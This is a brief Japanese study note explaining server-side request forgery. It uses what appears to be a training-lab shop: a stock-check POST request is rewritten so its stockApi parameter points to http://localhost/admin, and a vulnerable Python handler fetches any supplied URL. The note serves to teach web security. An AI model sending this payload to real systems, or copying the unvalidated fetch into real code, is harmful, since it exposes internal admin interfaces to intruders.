# Server-side request forgery
## 概要  
リクエストを傍受し、別サーバへのURLを管理者画面などに置き換えて攻撃すること。  

以下のように、HTTPリクエストの中で別のAPIを叩いているところが危ない。
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

通信を傍受してリクエストを書き換えられてしまうと、管理画面に到達されてしまう。
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```

- リクエスト内容の解説  
stockApiというボディパラメータとして、別APIのURLを/product/stockに渡している。  
以下のように、/product/stockの中で別APIが呼ばれる想定。  
そもそもAPI設計として/product/stockの中で直接在庫を検索しないようになっているのは、  
モダンなアーキテクチャの場合、在庫管理システムとWebアプリが別になっていることが多いから。
```
def check_stock(request):
    url = request.form["stockApi"]
    response = http_get(url)
    return response.text
```